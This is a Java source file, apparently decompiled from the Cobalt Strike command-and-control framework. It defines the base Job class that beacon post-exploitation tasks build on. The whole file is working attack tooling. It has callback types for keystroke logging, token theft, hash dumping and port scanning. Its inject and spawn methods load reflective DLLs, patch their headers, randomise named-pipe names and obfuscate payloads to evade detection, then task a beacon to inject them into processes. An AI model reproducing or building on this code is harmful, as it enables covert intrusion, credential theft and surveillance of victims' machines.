package beacon;

import common.CommonUtils;
import common.ReflectiveDLL;
import common.SleevedResource;
import pe.PostExObfuscator;

public abstract class Job {
    public static final int CALLBACK_OUTPUT = 0;

    public static final int CALLBACK_KEYSTROKES = 1;

    public static final int CALLBACK_FILE = 2;

    public static final int CALLBACK_SCREENSHOT = 3;

    public static final int CALLBACK_CLOSE = 4;

    public static final int CALLBACK_READ = 5;

    public static final int CALLBACK_CONNECT = 6;

    public static final int CALLBACK_PING = 7;

    public static final int CALLBACK_FILE_WRITE = 8;

    public static final int CALLBACK_FILE_CLOSE = 9;

    public static final int CALLBACK_PIPE_OPEN = 10;

    public static final int CALLBACK_PIPE_CLOSE = 11;

    public static final int CALLBACK_PIPE_READ = 12;

    public static final int CALLBACK_POST_ERROR = 13;

    public static final int CALLBACK_PIPE_PING = 14;

    public static final int CALLBACK_TOKEN_STOLEN = 15;

    public static final int CALLBACK_TOKEN_GETUID = 16;

    public static final int CALLBACK_PROCESS_LIST = 17;

    public static final int CALLBACK_POST_REPLAY_ERROR = 18;

    public static final int CALLBACK_PWD = 19;

    public static final int CALLBACK_JOBS = 20;

    public static final int CALLBACK_HASHDUMP = 21;

    public static final int CALLBACK_PENDING = 22;

    public static final int CALLBACK_ACCEPT = 23;

    public static final int CALLBACK_NETVIEW = 24;

    public static final int CALLBACK_PORTSCAN = 25;

    public static final int CALLBACK_DEAD = 26;

    public static final int CALLBACK_SSH_STATUS = 27;

    public static final int CALLBACK_CHUNK_ALLOCATE = 28;

    public static final int CALLBACK_CHUNK_SEND = 29;

    public static final int CALLBACK_OUTPUT_OEM = 30;

    public static final int CALLBACK_ERROR = 31;

    public static final int CALLBACK_OUTPUT_UTF8 = 32;

    protected CommandBuilder builder = new CommandBuilder();

    protected TaskBeacon tasker;

    protected String arch = "";

    protected int pid = 0;

    public Job(TaskBeacon taskBeacon) {
        this.tasker = taskBeacon;
    }

    public boolean isInject() {
        return (this.pid != 0);
    }

    public int getJobType() {
        return 40;
    }

    public abstract String getDescription();

    public abstract String getShortDescription();

    public abstract String getDLLName();

    public abstract String getPipeName();

    public abstract int getCallbackType();

    public abstract int getWaitTime();

    public boolean ignoreToken() {
        return true;
    }

    public String getTactic() {
        return "";
    }

    public String getTactics(String string) {
        return "".equals(getTactic()) ? string : (getTactic() + ", " + string);
    }

    public void obfuscate(PostExObfuscator postExObfuscator, byte[] arrby) {
    }

    public byte[] _obfuscate(byte[] arrby) {
        PostExObfuscator postExObfuscator = new PostExObfuscator();
        postExObfuscator.process(arrby);
        obfuscate(postExObfuscator, arrby);
        return postExObfuscator.getImage();
    }

    public byte[] fix(byte[] arrby) {
        return arrby;
    }

    public byte[] setupSmartInject(byte[] arrby) {
        return !this.tasker.useSmartInject() ? arrby : PostExObfuscator.setupSmartInject(arrby);
    }

    public void inject(int n, String string) {
        this.pid = n;
        this.arch = string;
        byte[] arrby1 = SleevedResource.readResource(getDLLName());
        if (string.equals("x64")) {
            arrby1 = ReflectiveDLL.patchDOSHeaderX64(arrby1, 170532320);
            this.builder.setCommand(43);
        } else {
            arrby1 = ReflectiveDLL.patchDOSHeader(arrby1, 170532320);
            this.builder.setCommand(9);
        }
        String str = "\\\\.\\pipe\\" + CommonUtils.garbage(getPipeName());
        arrby1 = CommonUtils.strrep(arrby1, "\\\\.\\pipe\\" + getPipeName(), str);
        arrby1 = fix(arrby1);
        if (this.tasker.obfuscatePostEx())
            arrby1 = _obfuscate(arrby1);
        arrby1 = setupSmartInject(arrby1);
        this.builder.addInteger(n);
        this.builder.addInteger(0);
        this.builder.addString(CommonUtils.bString(arrby1));
        byte[] arrby2 = this.builder.build();
        this.builder.setCommand(getJobType());
        this.builder.addInteger(n);
        this.builder.addShort(getCallbackType());
        this.builder.addShort(getWaitTime());
        this.builder.addLengthAndString(str);
        this.builder.addLengthAndString(getShortDescription());
        byte[] arrby3 = this.builder.build();
        this.tasker.task(arrby2, arrby3, getDescription(), getTactics("T1055"));
    }

    public void spawn(String string1, String string2) {
        this.arch = string2;
        byte[] arrby1 = SleevedResource.readResource(getDLLName());
        if (string2.equals("x64")) {
            arrby1 = ReflectiveDLL.patchDOSHeaderX64(arrby1, 1453503984);
            if (ignoreToken()) {
                this.builder.setCommand(44);
            } else {
                this.builder.setCommand(90);
            }
        } else {
            arrby1 = ReflectiveDLL.patchDOSHeader(arrby1, 1453503984);
            if (ignoreToken()) {
                this.builder.setCommand(1);
            } else {
                this.builder.setCommand(89);
            }
        }
        String str = "\\\\.\\pipe\\" + CommonUtils.garbage(getPipeName());
        arrby1 = CommonUtils.strrep(arrby1, "\\\\.\\pipe\\" + getPipeName(), str);
        arrby1 = fix(arrby1);
        if (this.tasker.obfuscatePostEx())
            arrby1 = _obfuscate(arrby1);
        arrby1 = setupSmartInject(arrby1);
        this.builder.addString(CommonUtils.bString(arrby1));
        byte[] arrby2 = this.builder.build();
        this.builder.setCommand(getJobType());
        this.builder.addInteger(0);
        this.builder.addShort(getCallbackType());
        this.builder.addShort(getWaitTime());
        this.builder.addLengthAndString(str);
        this.builder.addLengthAndString(getShortDescription());
        byte[] arrby3 = this.builder.build();
        this.tasker.task(string1, arrby2, arrby3, getDescription(), getTactics("T1093"));
    }
}
